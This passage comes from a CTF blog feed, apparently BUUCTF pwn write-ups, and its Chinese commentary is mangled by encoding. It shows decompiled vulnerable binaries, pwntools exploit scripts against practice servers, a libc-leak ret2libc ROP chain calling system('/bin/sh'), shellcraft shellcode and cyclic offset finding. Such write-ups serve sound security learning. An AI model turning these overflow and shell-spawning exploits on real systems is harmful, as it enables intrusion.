+p32(win_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0xDEADBEEF</span>)+ p32(<span class="number">0xDEADC0DE</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x2D-xdctf2015-pwn200"><a href="#0x2D-xdctf2015-pwn200" class="headerlink" title="0x2D.xdctf2015_pwn200"></a>0x2D.xdctf2015_pwn200</h2><p>ç®€å•çš„ret2libc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">112</span>]; <span class="comment">// [esp+0h] [ebp-7Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> *v6; <span class="comment">// [esp+70h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = &amp;argc;</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf[<span class="number">24</span>], <span class="number">0</span>, <span class="number">0x4C</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  write(<span class="number">1</span>, buf, v3);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">104</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27296</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./bof&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./bof&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">vuln = <span class="number">0x080484D6</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>) + p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])+p32(vuln)+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">&#x27;write&#x27;</span>])+p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;\x21\x0a&quot;</span>)</span><br><span class="line">write_addr= u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write_addr)</span><br><span class="line">base = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys_addr = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>) +p32(sys_addr)+ p32(<span class="number">0xdeadbeef</span>)+p32(bin_sh) </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x2E-mrctf2020-shellcode"><a href="#0x2E-mrctf2020-shellcode" class="headerlink" title="0x2E.mrctf2020_shellcode"></a>0x2E.mrctf2020_shellcode</h2><p>ä¸èƒ½f5</p><p><img src="/2021/07/11/BUU-PWN-0x20-0x2F/image-20210712172029216.png" alt="image-20210712172029216"></p><p>ç›´æ¥å†™shellcodeå°±OKã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26222</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;mrctf2020_shellcode&quot;)</span></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>è¦åŠ ï¼š</p><p><code>context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;)</code></p><h2 id="0x2F-bbys-tu-2016"><a href="#0x2F-bbys-tu-2016" class="headerlink" title="0x2F.bbys_tu_2016"></a>0x2F.bbys_tu_2016</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+14h] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This program is hungry. You should feed it.&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you feel the flow?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹è¾“å…¥æ²¡æœ‰é™åˆ¶ï¼Œç”Ÿæˆä¸€äº›å­—ç¬¦ä¸²ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~$ cyclic 50</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; </span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama</span><br><span class="line"><span class="number">32</span><span class="keyword">in</span> isoc99_scanf.c</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> EAX  <span class="number">0x1</span></span><br><span class="line"> EBX  <span class="number">0xf7fb7000</span> (_GLOBAL_OFFSET_TABLE_) â—‚â€” <span class="number">0x1b2db0</span></span><br><span class="line"> ECX  <span class="number">0xa</span></span><br><span class="line"> EDX  <span class="number">0xf7fb887c</span> (_IO_stdfile_0_lock) â—‚â€” <span class="number">0x1</span></span><br><span class="line"> EDI  <span class="number">0xf7fb7e00</span> (stdin) â€”â–¸ <span class="number">0xf7fb75a0</span> (_IO_2_1_stdin_) â—‚â€” <span class="number">0xfbad2288</span></span><br><span class="line"> ESI  <span class="number">0xf7fb75a0</span> (_IO_2_1_stdin_) â—‚â€” <span class="number">0xfbad2288</span></span><br><span class="line"> EBP  <span class="number">0xffffd068</span> â€”â–¸ <span class="number">0xffffd098</span> â—‚â€” <span class="number">0x61616166</span> (<span class="string">&#x27;faaa&#x27;</span>)&lt;&lt;&lt;&lt;&lt;&lt;=è¿™é‡Œ</span><br><span class="line"> ESP  <span class="number">0xffffd040</span> â€”â–¸ <span class="number">0xf7fe77eb</span> (_dl_fixup+<span class="number">11</span>) â—‚â€” add    esi, <span class="number">0x15815</span></span><br><span class="line"> EIP  <span class="number">0xf7e60151</span> (__isoc99_scanf+<span class="number">129</span>) â—‚â€” <span class="keyword">and</span>    dword ptr [esi + <span class="number">0x3c</span>], <span class="number">0xffffffeb</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~$ cyclic -l 0x61616166</span><br><span class="line">20</span><br></pre></td></tr></table></figure><p>Expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25672</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./bbys_tu_2016&quot;)</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">20</span>+<span class="number">4</span>)+ p32(<span class="number">0x0804856D</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;0x20-jarvisoj-level3-x64&quot;&gt;&lt;a href=&quot;#0x20-jarvisoj-level3-x64&quot; class=&quot;headerlink&quot; title=&quot;0x20.jarvisoj_level3_x64&quot;&gt;&lt;/a&gt;0</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
</feed>
